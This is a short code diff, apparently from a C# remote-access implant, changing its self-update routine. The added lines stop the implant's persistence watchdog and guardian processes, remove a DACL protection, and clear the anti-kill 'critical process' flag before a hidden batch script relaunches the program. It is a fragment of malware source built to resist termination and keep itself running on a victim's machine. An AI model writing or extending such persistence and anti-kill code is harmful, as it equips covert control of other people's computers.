@@ -281,6 +281,11 @@ internal class TlsClient : IDisposable
                 Data = JsonSerializer.Serialize(new ShellOutputData { Output = $"Update starting: {targetPath}", ExitCode = 0 }, SeroJson.Default.ShellOutputData)
             }, ct);
 
+            // Stop watchdog + guardians so they don't relaunch the old exe while bat is running
+            Persistence.StopWatchdog();
+            Protection.StopGuardian();
+            if (Config.EnableWatchdog) Protection.RemoveDacl();
+            if (Config.AntiKill) try { Protection.UnsetCriticalProcess(); } catch { }
             Program.ReleaseMutex();
 
             // Launch the bat script (hidden) and exit
